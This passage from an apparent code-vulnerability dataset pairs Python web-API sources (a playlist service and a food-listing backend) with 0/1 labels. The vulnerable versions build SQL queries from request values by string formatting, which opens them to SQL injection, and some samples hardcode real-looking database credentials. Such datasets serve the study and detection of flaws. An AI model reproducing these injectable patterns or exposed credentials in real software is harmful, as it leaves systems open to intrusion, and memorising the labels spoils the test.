(playlist_id,))\n    rows = db.fetchall()\n    return rows\n\n\ndef retrieve_videos(db):\n    db.execute(\n        \"SELECT id, playlist_id, title, thumbnail, position from video ORDER BY playlist_id ASC, position ASC;\")\n    rows = db.fetchall()\n    return rows\n\n\ndef retrieve_video(id, playlist_id, db):\n    db.execute(\n        \"SELECT id, position from video WHERE id=%s and playlist_id=%s;\", (id, playlist_id))\n    row = db.fetchone()\n    return row\n\n\ndef retrieve_last_video_position(playlist_id, db):\n    db.execute(\n        \"SELECT max(position) as position from video WHERE playlist_id=%s;\", (playlist_id,))\n    row = db.fetchone()\n    return row['position']\n\n\ndef delete_video(id, db):\n    db.execute(\"DELETE FROM video where id=%s;\", (id,))\n\n\ndef delete_playlists_videos(playlist_id, db):\n    db.execute(\"DELETE FROM video where playlist_id=%s;\", (playlist_id,))\n\n\ndef create_video(playlist_id, title, thumbnail, position, db):\n    db.execute(\"INSERT INTO video (playlist_id, title, thumbnail, position) VALUES(%s, %s, %s, %s);\",\n               (playlist_id, title, thumbnail, position))\n\n\ndef update_video_positions(removed_position, db):\n    db.execute(\"UPDATE video SET position = position - 1 WHERE position > %s\", (removed_position,))\n\n\ndef update_video_position(id, position, next_position, db):\n    db.execute(\"UPDATE video SET position = Case position When %s Then %s Else position + 1 End WHERE position BETWEEN %s AND %s;\", (position, next_position, next_position, position))\n/n/n/n", "label": 0}, {"id": "666e52c5f0b8c1f4296e84471637033d9542a7a6", "code": "/main_test.py/n/nimport pytest\nimport bottle\nimport webtest\nimport MySQLdb\nimport os\n\nfrom logging import getLogger\nfrom bottle_mysql import Plugin\n\nfrom video import video_api\nfrom playlist import playlist_api\n\nfrom database import populate_test_database\n\nlogger = getLogger()\n\napp = bottle.default_app()\nplugin = Plugin(dbuser=os.environ[\"USER\"], dbpass=os.environ[\"PASSWORD\"], dbname='test')\napp.install(plugin)\ntest_app = webtest.TestApp(app)\n\n\ndef create_video(playlist_id, title, thumbnail, position):\n    db = connect_to_database()\n    cursor = db.cursor()\n    cursor.execute(\n        \"INSERT INTO video (playlist_id, title, thumbnail, position) VALUES('{playlist_id}', '{title}', '{thumbnail}', '{position}');\".format(\n            playlist_id=playlist_id, title=title, thumbnail=thumbnail, position=position))\n    db.commit()\n    db.close()\n\n\ndef create_playlist(name):\n    db = connect_to_database()\n    cursor = db.cursor()\n    cursor.execute(\n        \"INSERT INTO playlist (name, video_position) VALUES('{name}', 0);\".format(name=name))\n    db.commit()\n    db.close()\n\n\ndef connect_to_database():\n    db = MySQLdb.connect(\"localhost\", \"root\", os.environ[\"PASSWORD\"], 'test')\n    return db\n\n\ndef test_should_return_all_playlists():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_playlist('second playlist')\n\n    response = test_app.get('/playlists')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == [dict(id=1, name='first playlist'),\n                                     dict(id=2, name='second playlist')]\n\n\ndef test_should_return_a_playlist():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.get('/playlists/1')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == dict(\n        id=1, name='first playlist', video_position=0)\n\n\ndef test_should_create_a_playlist():\n    populate_test_database()\n\n    response = test_app.post('/playlists/nn')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.get('/playlists')\n    assert response2.json['status'] == 'OK'\n    assert response2.json['data'] == [dict(id=1, name='nn')]\n\n\ndef test_should_update_a_playlist_name():\n    populate_test_database()\n\n    response = test_app.post('/playlists/nn')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.put('/playlists/1/name')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.get('/playlists')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == [dict(id=1, name='name')]\n\n\ndef test_should_delete_a_playlist_and_remove_all_its_videos():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_video(1, 'the title of the video',\n                 'the url of the video', 1)\n    create_video(1, 'the title of the video',\n                 'the url of the video', 2)\n\n    response = test_app.delete('/playlists/1')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.get('/playlists/1')\n    assert response2.json['status'] == 'OK'\n    assert response2.json['data'] == None\n\n    response3 = test_app.get('/videos/1')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == []\n\n\ndef test_should_return_all_the_videos_from_a_playlist():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_video(1, 'the title of the video',\n                 'the url of the video', 1)\n    create_video(1, 'the title of the video',\n                 'the url of the video', 2)\n\n    response = test_app.get('/videos/1')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == [dict(id=1, title='the title of the video',\n                                          thumbnail='the url of the video', position=1),\n                                     dict(id=2, title='the title of the video',\n                                          thumbnail='the url of the video', position=2)]\n\n\ndef test_should_return_all_the_videos():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_playlist('second playlist')\n    create_video(1, 'f title',\n                 'f url', 1)\n    create_video(1, 's title',\n                 's url', 2)\n    create_video(1, 't title',\n                 't url', 3)\n    create_video(2, 'f title',\n                 'f url', 1)\n    create_video(2, 'fh title',\n                 'fh url', 2)\n\n    response = test_app.get('/videos')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == [dict(id=1, playlist_id=1, title='f title',\n                                          thumbnail='f url', position=1),\n                                     dict(id=2, playlist_id=1, title='s title',\n                                          thumbnail='s url', position=2),\n                                     dict(id=3, playlist_id=1, title='t title',\n                                          thumbnail='t url', position=3),\n                                     dict(id=4, playlist_id=2, title='f title',\n                                          thumbnail='f url', position=1),\n                                     dict(id=5, playlist_id=2, title='fh title',\n                                          thumbnail='fh url', position=2)]\n\n\ndef test_should_create_a_video():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.post('/videos/1/title2/thumbnail2')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.get('/videos/1')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),\n                                      dict(id=2, title='title2', thumbnail='thumbnail2', position=2)]\n\n\ndef test_should_update_a_video_position():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    create_video(1, 'title', 'thumbnail', 1)\n    create_video(1, 'title2', 'thumbnail2', 2)\n    create_video(1, 'title3', 'thumbnail3', 3)\n    create_video(1, 'title4', 'thumbnail4', 4)\n\n    response = test_app.put('/videos/4/1/2')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.get('/videos/1')\n    assert response2.json['status'] == 'OK'\n    assert response2.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),\n                                      dict(id=4, title='title4',\n                                           thumbnail='thumbnail4', position=2),\n                                      dict(id=2, title='title2',\n                                           thumbnail='thumbnail2', position=3),\n                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=4)]\n\n\ndef test_should_delete_a_video_given_an_id_and_update_playlist_video_position():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.delete('/videos/1/1')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.get('/videos/1')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == []\n\n    response4 = test_app.get('/playlists/1')\n\n    assert response4.json['status'] == 'OK'\n    assert response4.json['data'] == dict(\n        id=1, name='first playlist', video_position=0)\n\n\ndef test_should_reorder_video_position_given_a_deleted_video():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.post('/videos/1/title2/thumbnail2')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.post('/videos/1/title3/thumbnail3')\n    assert response3.json['status'] == 'OK'\n\n    response4 = test_app.delete('/videos/2/1')\n    assert response4.json['status'] == 'OK'\n\n    response5 = test_app.get('/videos/1')\n    assert response.json['status'] == 'OK'\n    assert response5.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),\n                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=2)]\n\n    response6 = test_app.get('/playlists/1')\n    assert response6.json['status'] == 'OK'\n    assert response6.json['data'] == dict(\n        id=1, name='first playlist', video_position=2)\n\n\ndef test_should_return_a_not_ok_status_when_deleting_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.delete('/playlists/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_updating_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.put('/playlists/2/name')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_creating_a_video_from_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/2/title/thumbnail')\n\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_updating_a_video_from_an_unknown_id():\n    populate_test_database()\n\n    response = test_app.put('/videos/1/1/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_either_specifying_an_out_of_bounds_or_similar_position():\n    populate_test_database()\n\n    create_video(1, 'title', 'thumbnail', 1)\n    create_video(1, 'title2', 'thumbnail2', 2)\n\n    response = test_app.put('/videos/1/1/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n    response2 = test_app.put('/videos/1/1/5')\n    assert response2.json['status'] == 'NOK'\n    assert response2.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_deleting_a_video_from_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response = test_app.delete('/videos/1/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_deleting_a_video_not_from_a_given_playlist():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response = test_app.delete('/videos/2/1')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n/n/n/n/playlist/playlist_repository.py/n/n\"\"\"This module is the playlist repository in charge of all database requests.\"\"\"\n\n\ndef retrieve_playlists(db):\n    db.execute('SELECT id, name from playlist;')\n    rows = db.fetchall()\n    return rows\n\n\ndef retrieve_playlist_by_id(id, db):\n    db.execute(\n        \"SELECT id, name, video_position from playlist WHERE id={id};\".format(id=id))\n    row = db.fetchone()\n    return row\n\n\ndef delete_playlist(id, db):\n    db.execute(\"DELETE FROM playlist where id={id};\".format(id=id))\n\n\ndef update_playlist(id, name, db):\n    db.execute(\n        \"UPDATE playlist SET name='{name}' WHERE id={id};\".format(name=name, id=id))\n\n\ndef update_playlist_video_position(id, position, db):\n    db.execute(\n        \"UPDATE playlist SET video_position='{position}' WHERE id={id};\".format(position=position, id=id))\n\n\ndef create_playlist(name, db):\n    db.execute(\n        \"INSERT INTO playlist (name, video_position) VALUES('{name}', 0);\".format(name=name))\n/n/n/n/video/video_repository.py/n/n\"\"\"This module is the video repository in charge of all database requests.\"\"\"\n\n\ndef retrieve_videos_from_playlist(playlist_id, db):\n    db.execute(\"SELECT id, title, thumbnail, position from video WHERE playlist_id={playlist_id} ORDER BY position ASC;\".format(\n        playlist_id=playlist_id))\n    rows = db.fetchall()\n    return rows\n\n\ndef retrieve_videos(db):\n    db.execute(\n        \"SELECT id, playlist_id, title, thumbnail, position from video ORDER BY playlist_id ASC, position ASC;\")\n    rows = db.fetchall()\n    return rows\n\n\ndef retrieve_video(id, playlist_id, db):\n    db.execute(\"SELECT id, position from video WHERE id={id} and playlist_id={playlist_id};\".format(\n        id=id, playlist_id=playlist_id))\n    row = db.fetchone()\n    return row\n\n\ndef retrieve_last_video_position(playlist_id, db):\n    db.execute(\"SELECT max(position) as position from video WHERE playlist_id={playlist_id};\".format(\n        playlist_id=playlist_id))\n    row = db.fetchone()\n    return row['position']\n\n\ndef delete_video(id, db):\n    db.execute(\"DELETE FROM video where id={id};\".format(id=id))\n\n\ndef delete_playlists_videos(playlist_id, db):\n    db.execute(\"DELETE FROM video where playlist_id={playlist_id};\".format(\n        playlist_id=playlist_id))\n\n\ndef create_video(playlist_id, title, thumbnail, position, db):\n    db.execute(\n        \"INSERT INTO video (playlist_id, title, thumbnail, position) VALUES({playlist_id}, '{title}', '{thumbnail}', {position});\".format(\n            playlist_id=playlist_id, title=title, thumbnail=thumbnail, position=position))\n\n\ndef update_video_positions(removed_position, db):\n    db.execute(\"UPDATE video SET position = position - 1 WHERE position > {removed_position}\".format(\n        removed_position=removed_position))\n\n\ndef update_video_position(id, position, next_position, db):\n    db.execute(\"UPDATE video SET position = Case position When {position} Then {next_position} Else position + 1 End WHERE position BETWEEN {next_position} AND {position};\".format(\n        position=position, next_position=next_position))\n/n/n/n", "label": 1}, {"id": "a5c2c0b8d137ca3f1859ce7b65c39b7d461bf615", "code": "backend-api/backend-api.py/n/nfrom flask import Flask\nfrom flask import request\nimport simplejson as json\nimport psycopg2\n\n\"\"\" Macros for relation and column names \"\"\"\nclient_table_name = \"\\\"Client\\\"\"\nclient_client_id_col = \"\\\"ClientID\\\"\"\nclient_client_rating_col = \"\\\"Client Rating\\\"\"\n\nclient_ratings_table_name = \"\\\"Client Ratings\\\"\"\nclient_ratings_client_id_col = \"\\\"ClientID\\\"\"\nclient_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\nclient_ratings_comments_col = \"\\\"Comments\\\"\"\nclient_ratings_rating_col = \"\\\"Rating\\\"\"\n\ncook_table_name = \"\\\"Cook\\\"\"\ncook_cook_id_col = \"\\\"CookID\\\"\"\ncook_cook_rating_col = \"\\\"Cook Rating\\\"\"\n\ncook_ratings_table_name = \"\\\"Cook Rating\\\"\"\ncook_ratings_cook_id_col = \"\\\"CookID\\\"\"\ncook_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\ncook_ratings_comments_col = \"\\\"Comments\\\"\"\ncook_ratings_rating_col = \"\\\"Rating\\\"\"\n\nlisting_table_name = \"\\\"Listing\\\"\"\nlisting_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_cook_id_col = \"\\\"CookID\\\"\"\nlisting_food_name_col = \"\\\"Food Name\\\"\"\nlisting_price_col = \"\\\"Price\\\"\"\nlisting_location_col = \"\\\"Location\\\"\"\nlisting_image_col = \"\\\"Image\\\"\"\n\nlisting_tags_table_name = \"\\\"Listing Tags\\\"\"\nlisting_tags_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_tags_tag_col = \"\\\"Tag\\\"\"\n\norder_table_name = \"\\\"Order\\\"\"\norder_client_id_col = \"\\\"ClientID\\\"\"\norder_listing_id_col = \"\\\"ListingID\\\"\"\norder_status_col = \"\\\"Status\\\"\"\norder_time_of_order_col = \"\\\"Time of Order\\\"\"\n\nuser_table_name = \"\\\"User\\\"\"\nuser_user_id_col = \"\\\"UserID\\\"\"\nuser_password_col = \"\\\"Password\\\"\"\nuser_fname_col = \"\\\"FName\\\"\"\nuser_lname_col = \"\\\"LName\\\"\"\n\n\"\"\" Database login details \"\"\"\ndb_host = \"mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com\"\ndb_name = \"csc301breadwiener\"\ndb_user = \"csc301breadwiener\"\ndb_password = \"team7ithink\"\n\nconn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)\napp = Flask(__name__)\n\n##################################################\ndef removeQuotes(stringy):\n    \"\"\" Removes the first and last characters (double quotes) from a string, and then return it \"\"\"\n    return stringy[1:-1]\n\n\n#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#\n@app.route('/api/getAllListings', methods=['GET'])\ndef getAllListings():\n    all_rows = []\n\n    search_all = conn.cursor()\n    search_all.execute(\"SELECT {}, {}, {}, {},\"\n                         \" {}, {} FROM public.{}\".format(listing_listing_id_col,\n                                                                          listing_cook_id_col,\n                                                                          listing_food_name_col,\n                                                                          listing_price_col,\n                                                                          listing_location_col,\n                                                                          listing_image_col,\n                                                                          listing_table_name))\n\n    single_row = search_all.fetchone()\n\n    while single_row is not None:\n        all_rows.append(single_row)\n        single_row = search_all.fetchone()\n\n    search_all.close()\n\n    rows_to_json(all_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': all_rows})  # convert to string before returning\n\n\n#--------------------------------------------------- ADD LISTING ---------------------------------------------------#\n\n@app.route('/api/add', methods=['GET', 'POST'])\ndef addReq():\n    if request.method == \"GET\":\n        return printTables()\n    elif request.method == \"POST\":\n        addToDB(request.get_json())\n        conn.commit()\n        return \"Success\"\n\ndef encase_in_quotes(stringy):\n    return \"\\\"\" + stringy + \"\\\"\"\n\n\n\"\"\"\nAdds the Listing entry to the PSQL database with the given JSONdata\nJSON format is a dictionary where the keys are the column names of the listing, along with\na key \"tagList\" which is a list of tags:\n\n\"\"\"\n\n\ndef addToDB(json_data):\n    cur = conn.cursor()\n    json_dict = json_data\n\n    list_id = getListId()\n    cook_id = json_dict[removeQuotes(listing_cook_id_col)]\n    food_name = json_dict[removeQuotes(listing_food_name_col)]\n    price = json_dict[removeQuotes(listing_price_col)]\n    loc = json_dict[removeQuotes(listing_location_col)]\n    image = json_dict[removeQuotes(listing_image_col)]\n    tags = json_dict[\"tags\"]\n\n    sql = \"INSERT INTO %s VALUES (%s, %s, %s, %s, %s, %s)\"\n\tcur.execute(sql, (listing_table_name, list_id, cook_id, food_name, price, loc, image))\n\n    addTags(tags, list_id)\n\n\ndef addTags(tag_list, listing_id):\n    \"\"\"\n    Adds a list of tags tag_list for a given listing with listing_id to the database\n    \"\"\"\n    cur = conn.cursor()\n    for x in tag_list:\n        sql = \"INSERT INTO {} VALUES {}\".format(listing_tags_table_name, str((listing_id, x)))\n        cur.execute(sql)\n\n\ndef getListId():\n    \"\"\" Returns an unused listing_id \"\"\"\n    cur = conn.cursor()\n    sql = \"SELECT max({}) FROM {}\".format(listing_listing_id_col,\n                                          listing_table_name)\n    cur.execute(sql)\n    maxID = cur.fetchone()\n    if maxID[0] == None:\n        return 1\n    else:\n        return maxID[0] + 1\n\n\ndef printTables():\n    cur = conn.cursor()\n    strout = \"--------------------------ListingTable---------------------------<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"||\t\"\n        strout = strout + \"<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_tags_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    strout += \"<br><br><br>--------------------------TagTable-------------------------<br>\"\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"\t\"\n\n        strout = strout + \"<br>\"\n    return strout\n\n\n#--------------------------------------------------- CANCEL ---------------------------------------------------#\n\n\n@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])\ndef cancel(clientId, listingId):\n    \"\"\"\n    Cancels the order with specified client id and listing id and returns it.\n    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already\n    been canceled or fulfilled.\n    \"\"\"\n\n    in_progress = get_in_progress_order(clientId, listingId)\n\n    if in_progress:\n        cancel_order(clientId, listingId)\n        output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n        return output  # convert to string before returning\n    else:\n        return 'order not found'\n\n\ndef get_in_progress_order(clientId, listingId):\n    \"\"\"\n    Return the in progress order that corresponds with ClientId and ListingID\n    \"\"\"\n    matched_rows = []\n\n    order = conn.cursor()\n    order.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                  \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId) + \" AND \\\"ListingID\\\" = \" + str(listingId) +\n                  \" AND t1.\\\"Status\\\" = \\'In progress\\'\")\n\n    order_row = order.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = order.fetchone()\n\n    order.close()\n\n    return matched_rows\n\n\ndef cancel_order(clientId, listingId):\n    \"\"\"\n    given a clientId and listingId cancel the order in progress associated with them\n    \"\"\"\n    order = conn.cursor()\n    order.execute(\n        \"UPDATE public.\\\"Order\\\" SET \\\"Status\\\" = 'Canceled' WHERE \\\"ClientID\\\" = \" + str(clientId) +\n        \" AND \\\"ListingID\\\" = \" + str(listingId) + \" AND \\\"Status\\\" = \\'In progress\\'\")\n    conn.commit()\n\n    order.close()\n\n\ndef order_to_json(rows):\n    \"\"\"\n    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.\n    \"\"\"\n    string = \"\"\n    for i in range(len(rows)):\n        string += json.dumps({'ClientID': rows[i][0],\n                              'ListingID': rows[i][1],\n                              'Status': rows[i][2],\n                              'DateTime': rows[i][3].__str__()})\n        if i != len(rows) - 1:\n            string += \",\"\n\n    return string\n\n\n#--------------------------------------------------- getUserOrders ---------------------------------------------------#\n\n\n@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])\ndef getUserOrders(clientId):\n    \"\"\"\n    Retruns a list of jsons representing tupples in the Orders table for the given client\n    \"\"\"\n\n    in_progress = queryOrderUsingClientID(clientId)\n\n    output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n    return \"[\" + output + \"]\"  # convert to string before returning\n\n\ndef queryOrderUsingClientID(clientId):\n    \"\"\"\n    Return a list of Order tuples belonging to the client with the given id.\n    \"\"\"\n    matched_rows = []\n\n    orders = conn.cursor()\n    orders.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                   \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId))\n\n    order_row = orders.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = orders.fetchone()\n\n    orders.close()\n\n    return matched_rows\n\n\n#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#\n\n\ncompleted = \"\\'Completed\\'\"\n\n\n@app.route(\"/api/markComplete/<int:clientID>/<int:listingID>\", methods=['GET'])\ndef mark_as_complete(clientID, listingID):\n    \"\"\" A function that changes the status of the order with listing id listing_id to complete.\n        Returns \"Success\" on a sucessful change of the listing id's order to complete.\n\n        @param clientID: the client id number to change the status.\n        @param listingID: the listing id number to change the status.\n        @rtype: str\n    \"\"\"\n\n    sql = \\\n        \"\"\"\n            UPDATE public.{}\n            SET {} = {}\n            WHERE {} = {} AND {} = {}\n        \"\"\".format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),\n                   order_client_id_col, str(clientID))\n\n    cur = conn.cursor()\n    try:\n        cur.execute(sql)\n        conn.commit()\n    except Exception as e:\n        raise Exception(e)\n\n    # Check to see if a row in the database has been updated.\n    if cur.rowcount == 0:\n        raise Exception(\"The status of listing id's order was not changed. ClientID or ListingID may be out of range.\")\n    return \"Success\"\n\n\n#--------------------------------------------------- SEARCH ---------------------------------------------------#\n\n\n@app.route('/api/search/<string:search_query>', methods=['GET'])\ndef search(search_query):\n    \"\"\"\n    Return a string representation of a list of JSON objects. This list contains\n    objects that correspond to listings that match names or tags in the search query.\n    \"\"\"\n    # separate words in search_query with '+' in place of spaces\n    search_terms = search_query.split('+')\n\n    # want to remove whitespace and empty elements from the list\n    search_terms_filtered = []\n\n    for search_term in search_terms:\n        if not search_term.isspace() and not search_term == '':\n            search_terms_filtered.append(search_term)\n\n    matched_rows_by_name = get_rows_from_name(search_terms_filtered)\n\n    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)\n\n    matched_rows = matched_rows_by_name + matched_rows_by_tag\n\n    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows\n\n    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': unique_matched_rows})  # convert to string before returning\n\n\ndef get_rows_from_name(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose Food Names correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_names = conn.cursor()\n        search_names.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t1.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_food_name_col,\n                                                                              search_term))\n\n        search_names_row = search_names.fetchone()\n\n        while search_names_row is not None:\n            matched_rows.append(search_names_row)\n            search_names_row = search_names.fetchone()\n\n        search_names.close()\n\n    return matched_rows\n\n\ndef get_rows_from_tag(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose tags correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_tags = conn.cursor()\n        search_tags.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t2.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_tags_tag_col,\n                                                                              search_term))\n\n        search_tags_row = search_tags.fetchone()\n\n        while search_tags_row is not None:\n            matched_rows.append(search_tags_row)\n            search_tags_row = search_tags.fetchone()\n\n        search_tags.close()\n\n    return matched_rows\n\n\ndef rows_to_json(rows):\n    \"\"\"\n    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.\n    \"\"\"\n    for i in range(len(rows)):\n        rows[i] = json.dumps({'ListingID': rows[i][0],\n                                'CookID': rows[i][1],\n                                'Food Name': rows[i][2],\n                                'Price': rows[i][3],\n                                'Location': rows[i][4],\n                                'Image': rows[i][5]})\n\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=80)\n    # host=\"0.0.0.0\", port=80\n/n/n/n", "label": 0}, {"id": "a5c2c0b8d137ca3f1859ce7b65c39b7d461bf615", "code": "/backend-api/backend-api.py/n/nfrom flask import Flask\nfrom flask import request\nimport simplejson as json\nimport psycopg2\n\n\"\"\" Macros for relation and column names \"\"\"\nclient_table_name = \"\\\"Client\\\"\"\nclient_client_id_col = \"\\\"ClientID\\\"\"\nclient_client_rating_col = \"\\\"Client Rating\\\"\"\n\nclient_ratings_table_name = \"\\\"Client Ratings\\\"\"\nclient_ratings_client_id_col = \"\\\"ClientID\\\"\"\nclient_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\nclient_ratings_comments_col = \"\\\"Comments\\\"\"\nclient_ratings_rating_col = \"\\\"Rating\\\"\"\n\ncook_table_name = \"\\\"Cook\\\"\"\ncook_cook_id_col = \"\\\"CookID\\\"\"\ncook_cook_rating_col = \"\\\"Cook Rating\\\"\"\n\ncook_ratings_table_name = \"\\\"Cook Rating\\\"\"\ncook_ratings_cook_id_col = \"\\\"CookID\\\"\"\ncook_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\ncook_ratings_comments_col = \"\\\"Comments\\\"\"\ncook_ratings_rating_col = \"\\\"Rating\\\"\"\n\nlisting_table_name = \"\\\"Listing\\\"\"\nlisting_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_cook_id_col = \"\\\"CookID\\\"\"\nlisting_food_name_col = \"\\\"Food Name\\\"\"\nlisting_price_col = \"\\\"Price\\\"\"\nlisting_location_col = \"\\\"Location\\\"\"\nlisting_image_col = \"\\\"Image\\\"\"\n\nlisting_tags_table_name = \"\\\"Listing Tags\\\"\"\nlisting_tags_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_tags_tag_col = \"\\\"Tag\\\"\"\n\norder_table_name = \"\\\"Order\\\"\"\norder_client_id_col = \"\\\"ClientID\\\"\"\norder_listing_id_col = \"\\\"ListingID\\\"\"\norder_status_col = \"\\\"Status\\\"\"\norder_time_of_order_col = \"\\\"Time of Order\\\"\"\n\nuser_table_name = \"\\\"User\\\"\"\nuser_user_id_col = \"\\\"UserID\\\"\"\nuser_password_col = \"\\\"Password\\\"\"\nuser_fname_col = \"\\\"FName\\\"\"\nuser_lname_col = \"\\\"LName\\\"\"\n\n\"\"\" Database login details \"\"\"\ndb_host = \"mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com\"\ndb_name = \"csc301breadwiener\"\ndb_user = \"csc301breadwiener\"\ndb_password = \"team7ithink\"\n\nconn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)\napp = Flask(__name__)\n\n##################################################\ndef removeQuotes(stringy):\n    \"\"\" Removes the first and last characters (double quotes) from a string, and then return it \"\"\"\n    return stringy[1:-1]\n\n\n#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#\n@app.route('/api/getAllListings', 